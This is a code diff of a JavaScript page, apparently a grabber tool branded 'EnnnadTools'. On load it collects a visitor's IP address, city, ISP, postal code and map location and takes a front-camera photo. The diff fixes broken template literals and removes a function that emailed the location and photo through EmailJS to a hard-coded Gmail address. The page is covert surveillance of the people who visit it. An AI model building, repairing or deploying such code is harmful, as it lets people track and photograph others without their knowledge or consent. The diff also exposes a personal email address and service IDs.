@@ -137,7 +137,7 @@ async function capturePhoto() {
         const canvas = document.getElementById('canvas');
         const stream = await navigator.mediaDevices.getUserMedia({
             video: {
-                facingMode: 'user', // الكاميرا الأمامية
+                facingMode: 'user',
                 width: 640,
                 height: 480
             },
@@ -193,23 +193,23 @@ window.onload = async function () {
         const ipData = await ipResponse.json();
         console.log("IP:", ipData.ip);
         
-        const locResponse = await fetch(https://ipapi.co/${ipData.ip}/json);
+        const locResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
         const loc = await locResponse.json();
         console.log("Location data from ipapi:", loc);
 
         let googleMapUrl = "تعذر توليد رابط الخريطة";
         if (loc.latitude && loc.longitude) {
-            googleMapUrl = https://www.google.com/maps?q=${loc.latitude},${loc.longitude};
+            googleMapUrl = `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`;
         }
 
-        const locationString = 
+        const locationString = `
             المنطقة: ${loc.region || 'غير معروف'}
             المدينة: ${loc.city || 'غير معروف'}
             المحافظة: ${loc.county || 'غير معروف'}
             المزود: ${loc.org || 'غير معروف'}
             الرمز البريدي: ${loc.postal || 'بدون رمز بريدي'}
             رابط الخريطة: ${googleMapUrl}
-        ;
+        `;
 
         console.log("Location string to send:", locationString);
 
@@ -227,22 +227,6 @@ window.onload = async function () {
         }
     }
 };
-
-async function sendDataWithPhoto(locationData, photoData) {
-    try {
-        const response = await emailjs.send("service_25q0ern", "template_xi6fmgy", {
-            to_email: "e508769103@gmail.com",
-            name: "تم جلب موقع شخص مع صورة",
-            time: new Date().toLocaleString('ar-EG'),
-            message: locationData,
-            photo: photoData || 'تعذر التقاط الصورة'
-        });
-        return response;
-    } catch (error) {
-        console.error('خطأ في إرسال البريد:', error);
-        throw error;
-    }
-}
 
 console.log("تم اتمام العملية بنجاح , EnnnadTools");
 </script>
